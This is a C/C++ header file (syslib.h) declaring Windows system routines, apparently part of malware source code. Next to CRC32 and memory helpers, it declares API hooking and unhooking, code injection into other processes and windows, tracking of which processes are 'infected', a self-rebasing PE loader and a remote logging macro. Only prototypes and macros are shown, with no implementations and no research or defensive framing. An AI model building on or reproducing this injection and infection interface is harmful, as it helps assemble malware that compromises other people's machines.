#ifndef SYSLIB_H_INCLUDED
#define SYSLIB_H_INCLUDED

#include <yvals.h>

DWORD chksum_crc32(unsigned char *block,unsigned int length);
void chksum_crc32gentab();
DWORD CalcFuncCRC32i(byte *data);

void *HookAPI(LPVOID lpFunc,LPVOID lpHandler);
void UnhookAPI(LPVOID lpFunc);
void UnhookAll();
LPVOID GetRealFunc(LPVOID lpHandler);
void InitAPIHook();

#define _GetRealFunc(x) __##x *p##x;\
                        p##x = (__##x*) GetRealFunc(&x##_handler)

#define hook(x) HookAPI(x,x##_handler)

bool IsProcess(DWORD ProcessId);
byte *ldr_GetImageBase(byte *lpImg);
void ldr_RebasePE();
DWORD ldr_GetImageSize();

int CompareObjects(HANDLE hObj1,HANDLE hObj2);

#define SWAPLONG(x) MAKELONG(SWAPWORD(HIWORD(x)),SWAPWORD(LOWORD(x)))
#define SWAPWORD(x) MAKEWORD(HIBYTE(x),LOBYTE(x))

typedef bool Wow64InjectProc(LPVOID lpFunction,DWORD dwPID,LPVOID lpParam);
void InitInjector(Wow64InjectProc *lpWOW64Proc);
bool IsProcessInfected(DWORD dwPID);
HANDLE MarkProcessAsInfected(DWORD dwPID);
bool InjectWnd(LPTHREAD_START_ROUTINE lpFunction,HWND hWnd,LPVOID lpParam);
bool InjectProc(LPVOID lpFunction,DWORD dwPID,LPVOID lpParam);
void DestroyInject();

unsigned long xor128(int val);
void Init_xor128();

void GetUserDirA(char *lpOut);
void GetUserDirW(WCHAR *lpOut);
#ifdef UNICODE
#define GetUserDir GetUserDirW
#else
#define GetUserDir GetUserDirA
#endif

extern "C" bool SysCloseHandle(HANDLE hHandle);
bool NetworkIsConnectionEstablished(char *lpAddress,WORD wPort);
bool SysCheckProcessGroup(DWORD dwProcessId);
DWORD FindProcess(TCHAR *lpFileName);
bool IsUserAdmin();

extern "C" void *MemAlloc(size_t dwSize);
extern "C" void *MemRealloc(void *lpMem,size_t dwSize);
extern "C" void MemFree(void *lpMem);
void MemInit();

TCHAR *GetTmpFileName();
extern "C" void dprintf(TCHAR *msg, ...);
extern "C" void dprintf_wnd(HWND hWnd,TCHAR *lpStr);
extern "C" void WebLog(TCHAR *lpHost,TCHAR *lpFile,int dwLine,TCHAR *lpMsg);

#ifndef __FILET__
#ifdef _UNICODE
#define __FILET__ __FILEW__
#else
#define __FILET__ __FILE__
#endif
#endif
#define SendLog(szUrl,szMsg) WebLog(szUrl,__FILET__,__LINE__,szMsg)

#endif // SYSLIB_H_INCLUDED
